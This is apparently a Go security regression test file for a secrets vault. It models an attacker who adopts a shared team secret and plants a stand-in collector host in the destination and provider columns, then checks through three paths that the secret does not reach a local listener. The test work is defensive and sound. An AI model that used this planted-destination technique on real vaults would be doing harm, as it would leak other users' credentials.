package handlers

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"

	"github.com/bright-interaction/trustissues/internal/db"
	timw "github.com/bright-interaction/trustissues/internal/middleware"
	"github.com/bright-interaction/trustissues/internal/vaultegress"
)

// THE MIGRATION CLEARED THE ANSWER AND LEFT THE QUESTION EVIDENCE IN PLACE.
//
// Migrations 00034 and 00035 withhold secret_owner_user_id on every row the
// database cannot prove, and mayDirectSecretEgress refuses an empty owner. Both
// are right. Neither of them is the whole exit.
//
// ownerRecordedDestinations is the entire allowlist behind
// ChosenByTheEntrysOwnRecord, and before this round it built that allowlist by
// reading the row:
//
//	step 2  destination_patterns      -> add(host)   NO OWNER CHECK
//	step 3  provider + provider_meta  -> add(host)   NO OWNER CHECK
//	step 4  the rotation targets      -> skipped unless mayConfigureDelivery(ConfiguredBy)
//
// Only step 4 asked whose it was. Steps 2 and 3 are the exact columns an
// attacker writes while they hold user_id, which is the position migration 00034
// exists because they can reach: DELETE the creator from the collection, then
// PUT a new name, and AdoptAndRenameVaultEntry hands them the custodian column.
// 00034's own header says "an authority derived from data the attacker can write
// is not an authority"; the delivery gate shipped beside it still was one.
//
// So on the ALREADY-ATTACKED database, after BOTH migrations, with
// secret_owner_user_id = "" and mayDirectSecretEgress returning false, the
// victim's decrypted secret still arrived at the host the attacker chose. Three
// ways. Each of the three is driven end to end and asserted on what a REAL
// LISTENING SOCKET received, never on a status code, and each has a positive
// control on the same code path so a green run cannot mean "the feature is
// broken for everybody".

// ── the sink ────────────────────────────────────────────────────────────────

// tlsSink is headerSink over TLS, for the one door whose upstream URL the
// product builds with a hardcoded https scheme (CapabilityHandler.Proxy).
//
// It is a real listener on a real port. The proxy is pointed at it by a
// transport that dials this address whatever hostname it was asked for, which
// is how a test gets to keep the attacker's chosen hostname in the token, the
// ceiling and the request line while still watching the bytes land.
type tlsSink struct {
	*httptest.Server
	mu      sync.Mutex
	auths   []string
	lines   []string
	payload []string
}

func newTLSSink(t *testing.T) *tlsSink {
	t.Helper()
	s := &tlsSink{}
	s.Server = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		s.mu.Lock()
		s.auths = append(s.auths, r.Header.Get("Authorization"))
		s.lines = append(s.lines, r.Method+" "+r.Host+r.URL.Path)
		s.payload = append(s.payload, string(b))
		s.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"ok":true}`))
	}))
	t.Cleanup(s.Close)
	return s
}

func (s *tlsSink) received() (auths, lines, payloads []string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]string(nil), s.auths...),
		append([]string(nil), s.lines...),
		append([]string(nil), s.payload...)
}

func (s *tlsSink) sawSecret(secret string) bool {
	auths, lines, payloads := s.received()
	for _, group := range [][]string{auths, lines, payloads} {
		for _, v := range group {
			if strings.Contains(v, secret) {
				return true
			}
		}
	}
	return false
}

// client returns an http.Client that resolves EVERY hostname to this sink's
// real address. Nothing is faked above the socket: a TCP connection is opened, a
// TLS handshake completes, and the bytes are read by an http.Server.
func (s *tlsSink) client() *http.Client {
	addr := s.Listener.Addr().String()
	return &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // a test listener with a self-signed cert
			DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
				return (&net.Dialer{}).DialContext(ctx, network, addr)
			},
		},
	}
}

// ── the fixture: a database that has ALREADY been attacked ──────────────────

// attackedEnv is one shared team secret on a database where the round-7 attack
// already ran and both migrations have since been applied.
type attackedEnv struct {
	h        *VaultHandler
	cap      *CapabilityHandler
	router   http.Handler
	queries  *db.Queries
	victim   string
	attacker string
	// viewer is an accepted vault_only VIEWER of the collection. They are not
	// the attacker; door 2 exists because the attacker does not have to be the
	// caller.
	viewer         string
	viewerPassword string
	entryID        string
	entryName      string
	secret         string
}

const (
	attackedSecretValue = "sk_live_THE_TEAM_SECRET"
	attackedHost        = "collector.attacker-controlled.example"
	attackedViewerPass  = "viewer-own-login-password"
)

// newAttackedEnv builds the state the finding is about, in the order it really
// happened.
//
//  1. the victim creates the entry and shares it. They are creator, custodian
//     and owner.
//  2. the victim records the destinations they actually wanted.
//  3. the attacker, an accepted MANAGER, removes the victim from the collection
//     and adopts the entry. user_id is now theirs. THIS IS THE ROUND-7 ATTACK
//     and it is why secret_owner_user_id exists.
//  4. while holding user_id, and while the pre-00034 authority read user_id,
//     they rewrite destination_patterns and provider_meta to a host they
//     control. Both writes were accepted at the time, by a gate that was asking
//     the right question of the wrong column.
//  5. the deploy happens. 00034 and 00035 run and WITHHOLD the owner, because
//     the database cannot prove who deposited the plaintext.
//
// Step 4 is written with the fixture writers rather than through PUT
// /api/vault/{id}, because the write it models was accepted by a binary that no
// longer exists. That is the whole point of a delivery gate: the rows it has to
// hold against are the ones no current write gate ever saw.
func newAttackedEnv(t *testing.T, tag string) *attackedEnv {
	t.Helper()
	swapProviderHTTP(t)

	h, queries := newCollectionAuthzEnv(t)
	capH, err := NewCapabilityHandler(h.db, h, testEgressVaultKey)
	if err != nil {
		t.Fatalf("NewCapabilityHandler: %v", err)
	}
	router := chi.NewRouter()
	router.HandleFunc("/proxy/{host}/*", capH.Proxy)

	e := &attackedEnv{
		h: h, cap: capH, router: router, queries: queries,
		entryID:        "entry-attacked-" + tag,
		entryName:      "team-key-" + tag,
		secret:         attackedSecretValue,
		viewerPassword: attackedViewerPass,
	}
	e.victim = mustUser(t, queries, "victim-"+tag+"@example.com", "user", "victim-login-password")
	// Role user, not vault_only: POST /api/secrets/issue refuses vault_only in
	// the handler, so an attacker who could only ever be vault_only would fail
	// door 1 for a reason that has nothing to do with the finding.
	e.attacker = mustUser(t, queries, "attacker-"+tag+"@example.com", "user", "attacker-login-password")
	e.viewer = mustUser(t, queries, "viewer-"+tag+"@example.com", "vault_only", attackedViewerPass)

	coll := "coll-" + tag
	mustCollection(t, queries, coll, e.victim, map[string]string{
		e.victim:   collRoleManager,
		e.attacker: collRoleManager,
		e.viewer:   collRoleViewer,
	})
	mustEntry(t, h, queries, e.entryID, e.victim, e.entryName, e.secret)
	placeInCollection(t, queries, e.entryID, coll)
	// The OpenAI-style bearer injection, so door 1 has something to inject. A
	// missing spec would let the door-1 assertion pass for the wrong reason.
	if _, err := h.db.Exec(`UPDATE vault_entries SET injection_spec = ? WHERE id = ?`,
		`{"type":"bearer"}`, e.entryID); err != nil {
		t.Fatalf("seed injection spec: %v", err)
	}

	// STEP 3: the adoption. Modelled on the column, because
	// AdoptAndRenameVaultEntry is what wrote it and its precondition (the
	// creator is no longer a member) is arranged the same way the attack does.
	if _, err := queries.RemoveCollectionMember(context.Background(), db.RemoveCollectionMemberParams{
		CollectionID: coll, UserID: e.victim,
	}); err != nil {
		t.Fatalf("remove the creator from the collection: %v", err)
	}
	if _, err := h.db.Exec(`UPDATE vault_entries SET user_id = ? WHERE id = ?`, e.attacker, e.entryID); err != nil {
		t.Fatalf("model the adoption: %v", err)
	}

	// STEP 4: the plants. Both of them are host-choosing columns, and both were
	// accepted by the authority that read user_id.
	if err := setDestinationPatternsFixture(t, queries, vaultegress.DestinationPatternsParams{
		DestinationPatterns: `["` + attackedHost + `/*"]`, ID: e.entryID,
	}); err != nil {
		t.Fatalf("plant the ceiling: %v", err)
	}
	// forgejo builds its whole base URL out of meta["instance"], so this one
	// column names a host outright. auto_rotate + an overdue interval is what
	// puts the row in front of the unattended sweep.
	forceProviderConfig(t, h, e.entryID, "forgejo", `{"instance":"PLACEHOLDER"}`)

	// STEP 5: the deploy. Both migrations withhold the owner on a collection
	// entry, because nothing in the database separates "the creator still holds
	// it" from "a manager adopted it".
	clearSecretOwnerForTest(t, h, e.entryID)

	e.guardThePremise(t)
	return e
}

// pointProviderAt rewrites the planted provider_meta at the sink that is about
// to be watched. Separate from the fixture because the sink's port is not known
// until it is listening.
func (e *attackedEnv) pointProviderAt(t *testing.T, baseURL string) {
	t.Helper()
	forceProviderConfig(t, e.h, e.entryID, "forgejo", `{"instance":"`+baseURL+`"}`)
	// The withheld owner is re-planted: forceProviderConfig only touches the
	// provider columns, but re-running it after a repair test would be
	// misleading if the owner had moved.
	access, err := e.queries.GetVaultEntryAccess(context.Background(), e.entryID)
	if err != nil {
		t.Fatalf("read entry access: %v", err)
	}
	if access.SecretOwnerUserID != "" {
		t.Fatalf("ABORT: the fixture no longer has a withheld owner (%q)", access.SecretOwnerUserID)
	}
}

// guardThePremise refuses to run an attack against a state that is not the one
// the finding describes. Every one of these is a way the whole file could pass
// for the wrong reason.
func (e *attackedEnv) guardThePremise(t *testing.T) {
	t.Helper()
	ctx := context.Background()

	access, err := e.queries.GetVaultEntryAccess(ctx, e.entryID)
	if err != nil {
		t.Fatalf("read entry access: %v", err)
	}
	if access.SecretOwnerUserID != "" {
		t.Fatalf("ABORT: the migration did not withhold the owner (%q); this is not the attacked "+
			"database", access.SecretOwnerUserID)
	}
	if access.UserID != e.attacker {
		t.Fatalf("ABORT: the custodian is %q, not the attacker; the adoption did not take", access.UserID)
	}
	if !e.h.grantFor(ctx, e.attacker, false, e.entryID).manage {
		t.Fatal("ABORT: the attacker does not hold manage on the adopted entry, so they are not in " +
			"the position the finding describes")
	}
	// THE PREDICATE THE PREVIOUS ROUND SHIPPED, still saying no. If this ever
	// says yes the doors below would be authorised for an ordinary reason and
	// would prove nothing about the recorded evidence.
	if e.h.mayDirectSecretEgress(ctx, e.attacker, false, e.entryID) {
		t.Fatal("ABORT: mayDirectSecretEgress says the attacker MAY direct this secret. The empty-owner " +
			"rule has regressed and this file is measuring the wrong defect")
	}
	if e.h.mayConfigureDelivery(ctx, e.attacker, e.entryID) {
		t.Fatal("ABORT: mayConfigureDelivery says yes for the attacker on a withheld row")
	}
	// The viewer can USE the secret. That is correct and it is what door 2
	// rides: a vault_only viewer is allowed to validate a key they may spend.
	if !e.h.entryCurrentlyUsableBy(ctx, e.viewer, e.entryID) {
		t.Fatal("ABORT: the viewer cannot use the shared entry, so door 2 would be refused for a " +
			"reason that is not the one under test")
	}
	// And there is NO AI-gateway pin. The pin is instance-chosen and would cap
	// the entry on its own, which is a different mechanism from the one this
	// file is about.
	pin, pErr := providerPinFor(ctx, e.queries, e.entryID)
	if pErr != nil {
		t.Fatalf("read the provider pin: %v", pErr)
	}
	if pin.pinned() {
		t.Fatal("ABORT: the entry is pinned to an AI provider; every door below would be refused by " +
			"the pin rather than by the rule under test")
	}
}

// ── DOOR 1: the capability proxy ────────────────────────────────────────────

// TestDoor1CapabilityProxyRefusesAPlantedCeilingOnAWithheldRow drives
// POST /api/secrets/issue and then POST /proxy/... as the attacker, and asserts
// on what a real TLS listener received.
func TestDoor1CapabilityProxyRefusesAPlantedCeilingOnAWithheldRow(t *testing.T) {
	env := newAttackedEnv(t, "door1")
	sink := newTLSSink(t)
	env.cap.SetHTTPClient(sink.client())

	body, _ := json.Marshal(issueRequest{
		Secret: env.entryName, AgentID: "attacker-agent", Dests: []string{attackedHost + "/*"},
	})
	ir := httptest.NewRequest(http.MethodPost, "/api/secrets/issue", strings.NewReader(string(body)))
	ir = ir.WithContext(context.WithValue(ir.Context(), timw.UserIDKey, env.attacker))
	issued := httptest.NewRecorder()
	env.cap.Issue(issued, ir)

	var minted issueResponse
	_ = json.Unmarshal(issued.Body.Bytes(), &minted)

	var proxied *httptest.ResponseRecorder
	if minted.Token != "" {
		req := httptest.NewRequest(http.MethodPost, "/proxy/"+attackedHost+"/collect",
			strings.NewReader(`{"model":"gpt-4"}`))
		req.Header.Set("Authorization", "Capability "+minted.Token)
		proxied = httptest.NewRecorder()
		env.router.ServeHTTP(proxied, req)
	}

	auths, lines, payloads := sink.received()
	if sink.sawSecret(env.secret) {
		t.Fatalf("DOOR 1 IS OPEN. The victim's secret reached the attacker's listener.\n"+
			"  auth headers:  %q\n  request lines: %q\n  bodies:        %q\n"+
			"  issue=%d proxy=%v", auths, lines, payloads, issued.Code, codeOf(proxied))
	}
	if len(lines) != 0 {
		t.Errorf("the attacker's listener received %v; a withheld row should attempt nothing", lines)
	}
	t.Logf("door 1: issue=%d proxy=%v, listener received %d requests",
		issued.Code, codeOf(proxied), len(lines))
}

// TestDoor1PositiveControl is the same code path with the ownership question
// answered. A gate that stops the product working is not a fix.
func TestDoor1PositiveControl(t *testing.T) {
	swapProviderHTTP(t)
	h, queries := newCollectionAuthzEnv(t)
	capH, err := NewCapabilityHandler(h.db, h, testEgressVaultKey)
	if err != nil {
		t.Fatalf("NewCapabilityHandler: %v", err)
	}
	router := chi.NewRouter()
	router.HandleFunc("/proxy/{host}/*", capH.Proxy)
	sink := newTLSSink(t)
	capH.SetHTTPClient(sink.client())

	const theKey = "sk_live_OWNERS_OWN_KEY"
	owner := mustUser(t, queries, "pos1-owner@example.com", "user", "owner-login-password")
	mustEntry(t, h, queries, "entry-pos1", owner, "owners-key", theKey)
	if _, err := h.db.Exec(`UPDATE vault_entries SET injection_spec = ? WHERE id = ?`,
		`{"type":"bearer"}`, "entry-pos1"); err != nil {
		t.Fatalf("seed injection spec: %v", err)
	}
	// THE OWNER'S OWN CEILING, set through the real route.
	dests, _ := json.Marshal(map[string]any{"destination_patterns": []string{"api.partner.example/*"}})
	rec := httptest.NewRecorder()
	h.Update(rec, vaultAuthzRequest(http.MethodPut, "/api/vault/entry-pos1", owner, "user",
		"entry-pos1", string(dests)))
	if rec.Code != http.StatusOK {
		t.Fatalf("ABORT: the owner could not set their own ceiling (%d: %s)", rec.Code, rec.Body.String())
	}

	body, _ := json.Marshal(issueRequest{Secret: "owners-key", AgentID: "owner-agent"})
	ir := httptest.NewRequest(http.MethodPost, "/api/secrets/issue", strings.NewReader(string(body)))
	ir = ir.WithContext(context.WithValue(ir.Context(), timw.UserIDKey, owner))
	issued := httptest.NewRecorder()
	capH.Issue(issued, ir)
	if issued.Code != http.StatusCreated {
		t.Fatalf("THE FEATURE IS BROKEN: the owner could not mint for their own secret (%d: %s)",
			issued.Code, issued.Body.String())
	}
	var minted issueResponse
	if err := json.Unmarshal(issued.Body.Bytes(), &minted); err != nil || minted.Token == "" {
		t.Fatalf("mint returned no token: %s", issued.Body.String())
	}

	req := httptest.NewRequest(http.MethodPost, "/proxy/api.partner.example/v1/chat",
		strings.NewReader(`{"model":"gpt-4"}`))
	req.Header.Set("Authorization", "Capability "+minted.Token)
	proxied := httptest.NewRecorder()
	router.ServeHTTP(proxied, req)

	auths, lines, _ := sink.received()
	if len(lines) == 0 {
		t.Fatalf("THE FEATURE IS BROKEN. The owner's own proxy call reached nothing (proxy=%d: %s)",
			proxied.Code, proxied.Body.String())
	}
	if !sink.sawSecret(theKey) {
		t.Fatalf("the proxy reached %v but did not carry the key: auths=%q", lines, auths)
	}
	t.Logf("door 1 positive control: %v carried the real key to the real host", lines)
}

// ── DOOR 2: POST /api/vault/{id}/validate ───────────────────────────────────

// TestDoor2ValidateRefusesAPlantedProviderMetaOnAWithheldRow needs no
// capability token at all. Issue is behind VaultOnlyBlock; validate is on the
// vault surface and is not, so an accepted vault_only VIEWER reaches it with
// nothing but their OWN password.
func TestDoor2ValidateRefusesAPlantedProviderMetaOnAWithheldRow(t *testing.T) {
	env := newAttackedEnv(t, "door2")
	sink := newHeaderSink(t)
	env.pointProviderAt(t, sink.URL)

	rec := httptest.NewRecorder()
	env.h.ValidateKey(rec, vaultAuthzRequest(http.MethodPost,
		"/api/vault/"+env.entryID+"/validate", env.viewer, "vault_only", env.entryID,
		`{"password":`+quote(env.viewerPassword)+`}`))

	auths, lines, payloads := sink.received()
	if sink.sawSecret(env.secret) {
		t.Fatalf("DOOR 2 IS OPEN. A vault_only viewer's ordinary validate shipped the secret to the "+
			"attacker's listener.\n  auth headers:  %q\n  request lines: %q\n  bodies:        %q\n"+
			"  validate=%d %s", auths, lines, payloads, rec.Code, rec.Body.String())
	}
	if len(lines) != 0 {
		t.Errorf("the attacker's listener received %v; a withheld row should attempt nothing", lines)
	}
	t.Logf("door 2: validate=%d, listener received %d requests", rec.Code, len(lines))
}

// TestDoor2PositiveControl is the same route, same provider, same viewer, on an
// entry whose owner is recorded and whose provider the owner configured.
func TestDoor2PositiveControl(t *testing.T) {
	swapProviderHTTP(t)
	h, queries := newCollectionAuthzEnv(t)
	sink := newHeaderSink(t)

	const theKey = "sk_live_OWNED_AND_VALIDATED"
	owner := mustUser(t, queries, "pos2-owner@example.com", "user", "owner-login-password")
	viewer := mustUser(t, queries, "pos2-viewer@example.com", "vault_only", attackedViewerPass)
	mustCollection(t, queries, "coll-pos2", owner, map[string]string{
		owner: collRoleManager, viewer: collRoleViewer,
	})
	mustEntry(t, h, queries, "entry-pos2", owner, "owned-forgejo", theKey)
	placeInCollection(t, queries, "entry-pos2", "coll-pos2")
	forceProviderConfig(t, h, "entry-pos2", "forgejo", `{"instance":"`+sink.URL+`"}`)

	rec := httptest.NewRecorder()
	h.ValidateKey(rec, vaultAuthzRequest(http.MethodPost, "/api/vault/entry-pos2/validate",
		viewer, "vault_only", "entry-pos2", `{"password":`+quote(attackedViewerPass)+`}`))

	auths, lines, _ := sink.received()
	if len(lines) == 0 {
		t.Fatalf("THE FEATURE IS BROKEN. A viewer's validate on a properly owned entry reached "+
			"nothing (validate=%d: %s)", rec.Code, rec.Body.String())
	}
	if !sink.sawSecret(theKey) {
		t.Fatalf("validate reached %v without the key: auths=%q", lines, auths)
	}
	t.Logf("door 2 positive control: %v carried the real key to the owner's own host", lines)
}

// ── DOOR 3: the unattended scheduler ────────────────────────────────────────

// TestDoor3SchedulerRefusesAPlantedProviderMetaOnAWithheldRow has no caller at
// all. Nobody is authenticated, nobody's password is checked, and the row's own
// provider_meta names where the secret goes.
func TestDoor3SchedulerRefusesAPlantedProviderMetaOnAWithheldRow(t *testing.T) {
	env := newAttackedEnv(t, "door3")
	sink := newHeaderSink(t)
	env.pointProviderAt(t, sink.URL)
	ctx := context.Background()

	// ANTI-VACUITY. "The sweep sent nothing" is also what a sweep that never
	// looked at this row produces.
	due, err := env.queries.ListVaultEntriesNeedingRotation(ctx)
	if err != nil {
		t.Fatalf("list due entries: %v", err)
	}
	found := false
	for _, d := range due {
		if d.ID == env.entryID {
			found = true
		}
	}
	if !found {
		t.Fatalf("ABORT: the attacked row is not due, so the sweep is not exercising it (%d due)", len(due))
	}

	RotateVaultKeys(env.h.db, env.queries, env.h)
	if !env.h.WaitForDelivery(30 * time.Second) {
		t.Fatal("the sweep did not drain; the wire assertions would be racing it")
	}

	auths, lines, payloads := sink.received()
	if sink.sawSecret(env.secret) {
		t.Fatalf("DOOR 3 IS OPEN. The unattended sweep shipped the secret to the attacker's "+
			"listener.\n  auth headers:  %q\n  request lines: %q\n  bodies:        %q",
			auths, lines, payloads)
	}
	if len(lines) != 0 {
		t.Errorf("the attacker's listener received %v; a withheld row should attempt nothing", lines)
	}
	t.Logf("door 3: listener received %d requests", len(lines))
}

// TestDoor3PositiveControl is the same sweep on an entry whose owner is
// recorded, so an operator whose keys really do auto-rotate keeps rotating.
func TestDoor3PositiveControl(t *testing.T) {
	swapProviderHTTP(t)
	h, queries := newCollectionAuthzEnv(t)
	sink := newHeaderSink(t)
	ctx := context.Background()

	const theKey = "sk_live_ROTATES_ON_SCHEDULE"
	owner := mustUser(t, queries, "pos3-owner@example.com", "user", "owner-login-password")
	mustEntry(t, h, queries, "entry-pos3", owner, "scheduled-forgejo", theKey)
	forceProviderConfig(t, h, "entry-pos3", "forgejo", `{"instance":"`+sink.URL+`"}`)

	due, err := queries.ListVaultEntriesNeedingRotation(ctx)
	if err != nil {
		t.Fatalf("list due entries: %v", err)
	}
	if len(due) == 0 {
		t.Fatal("ABORT: nothing is due, so this control is measuring nothing")
	}

	RotateVaultKeys(h.db, queries, h)
	if !h.WaitForDelivery(30 * time.Second) {
		t.Fatal("the sweep did not drain")
	}

	auths, lines, _ := sink.received()
	if len(lines) == 0 {
		t.Fatal("THE FEATURE IS BROKEN. A scheduled rotation of a properly owned entry reached nothing")
	}
	if !sink.sawSecret(theKey) {
		t.Fatalf("the sweep reached %v without the key: auths=%q", lines, auths)
	}
	t.Logf("door 3 positive control: %v carried the real key to the owner's own host", lines)
}

// ── the repair, which is where read-time withholding alone runs out ─────────

// TestTheRepairDoesNotReArmThePlantedEvidence is the question the read-time
// rule leaves open, answered on the wire.
//
// ownerRecordedDestinations counts the ceiling and the meta-derived provider
// hosts only while the entry's recorded owner may still direct its secret. On
// the attacked row nobody may, so the evidence is inert. An admin claiming the
// entry at Settings -> Ownership ANSWERS that question, and if the answer alone
// were the fix the attacker's collector would come back to life under the
// admin's authority, which is the round-7 laundering with a helpful UI in front
// of it.
//
// So the claim withdraws the evidence in the same transaction as the ownership
// it grants, and says what it withdrew.
func TestTheRepairDoesNotReArmThePlantedEvidence(t *testing.T) {
	env := newAttackedEnv(t, "repair")
	sink := newHeaderSink(t)
	env.pointProviderAt(t, sink.URL)
	ctx := context.Background()

	admin := mustUser(t, env.queries, "repair-admin@example.com", "admin", "admin-login-password")
	rec := httptest.NewRecorder()
	env.h.ClaimSecretOwnership(rec, vaultAuthzRequest(http.MethodPost,
		"/api/admin/vault/"+env.entryID+"/ownership/claim", admin, "admin", env.entryID, ""))
	if rec.Code != http.StatusOK {
		t.Fatalf("THE REPAIR IS BROKEN: an admin could not claim an unowned entry (%d: %s)",
			rec.Code, rec.Body.String())
	}

	var wd withdrawnEvidence
	if err := json.Unmarshal(rec.Body.Bytes(), &wd); err != nil {
		t.Fatalf("the claim response is not readable (%s): %v", rec.Body.String(), err)
	}
	// The repair must TELL the operator, or the honest fail-closed answer is
	// indistinguishable from silent data loss.
	if len(wd.DestinationPatterns) == 0 {
		t.Error("the claim withdrew the ceiling without reporting it; an admin whose legitimate " +
			"patterns were cleared has nothing to re-enter from")
	}
	if _, ok := wd.ProviderMetaKeys["instance"]; !ok {
		t.Errorf("the claim did not report the withdrawn provider_meta host key: %+v", wd.ProviderMetaKeys)
	}

	access, err := env.queries.GetVaultEntryAccess(ctx, env.entryID)
	if err != nil {
		t.Fatalf("read entry access: %v", err)
	}
	if access.SecretOwnerUserID != admin {
		t.Fatalf("after the claim the owner is %q, want the admin; the repair did not take",
			access.SecretOwnerUserID)
	}
	// THE PREDICATE IS NOW YES. This is exactly the state that would re-arm the
	// evidence, which is why the assertion below is on the wire and not on it.
	if !env.h.mayDirectSecretEgress(ctx, admin, true, env.entryID) {
		t.Fatal("ABORT: the admin cannot direct the entry they just claimed, so this test is not " +
			"measuring the re-arming case")
	}

	// The sweep, unattended, against the row the attacker wrote.
	RotateVaultKeys(env.h.db, env.queries, env.h)
	if !env.h.WaitForDelivery(30 * time.Second) {
		t.Fatal("the sweep did not drain")
	}
	auths, lines, payloads := sink.received()
	if sink.sawSecret(env.secret) {
		t.Fatalf("THE REPAIR RE-ARMED THE ATTACK. Claiming ownership adopted the previous holder's "+
			"host.\n  auth headers:  %q\n  request lines: %q\n  bodies:        %q", auths, lines, payloads)
	}
	if len(lines) != 0 {
		t.Errorf("the attacker's listener received %v after the repair", lines)
	}
	t.Logf("repair: withdrew ceiling %v and provider_meta %v; listener received %d requests",
		wd.DestinationPatterns, wd.ProviderMetaKeys, len(lines))
}

// TestTheRepairedOwnerCanReEnterTheirOwnDestinations is the positive control for
// the withdrawal. Fail-closed that cannot be reopened is not fail-closed, it is
// broken.
func TestTheRepairedOwnerCanReEnterTheirOwnDestinations(t *testing.T) {
	env := newAttackedEnv(t, "reenter")
	sink := newHeaderSink(t)

	admin := mustUser(t, env.queries, "reenter-admin@example.com", "admin", "admin-login-password")
	claim := httptest.NewRecorder()
	env.h.ClaimSecretOwnership(claim, vaultAuthzRequest(http.MethodPost,
		"/api/admin/vault/"+env.entryID+"/ownership/claim", admin, "admin", env.entryID, ""))
	if claim.Code != http.StatusOK {
		t.Fatalf("claim: %d %s", claim.Code, claim.Body.String())
	}

	// The new owner puts back a provider host THEY choose, through the ordinary
	// route, which goes through egressgate.Decide with them as the authority.
	body, _ := json.Marshal(map[string]any{
		"provider":      "forgejo",
		"provider_meta": `{"instance":"` + sink.URL + `"}`,
	})
	put := httptest.NewRecorder()
	env.h.Update(put, vaultAuthzRequest(http.MethodPut, "/api/vault/"+env.entryID,
		admin, "admin", env.entryID, string(body)))
	if put.Code != http.StatusOK {
		t.Fatalf("THE FEATURE IS BROKEN: the repaired owner could not configure a provider (%d: %s)",
			put.Code, put.Body.String())
	}
	// Re-arm the schedule the attacker's row carried, so the sweep looks at it.
	if _, err := env.h.db.Exec(`UPDATE vault_entries SET auto_rotate = 1, rotation_interval_days = 1,
	         last_rotated_at = datetime('now','-90 days') WHERE id = ?`, env.entryID); err != nil {
		t.Fatalf("re-arm the schedule: %v", err)
	}

	RotateVaultKeys(env.h.db, env.queries, env.h)
	if !env.h.WaitForDelivery(30 * time.Second) {
		t.Fatal("the sweep did not drain")
	}
	auths, lines, _ := sink.received()
	if len(lines) == 0 {
		t.Fatal("THE FEATURE IS BROKEN. After the repair and a deliberate re-entry, the owner's own " +
			"host still received nothing")
	}
	if !sink.sawSecret(env.secret) {
		t.Fatalf("the sweep reached %v without the key: auths=%q", lines, auths)
	}
	t.Logf("repair positive control: %v carried the real key to the host the NEW owner chose", lines)
}

// codeOf renders a recorder that may not exist, for a message that has to work
// whether or not the earlier step got far enough to produce one.
func codeOf(rec *httptest.ResponseRecorder) any {
	if rec == nil {
		return "not reached"
	}
	return rec.Code
}
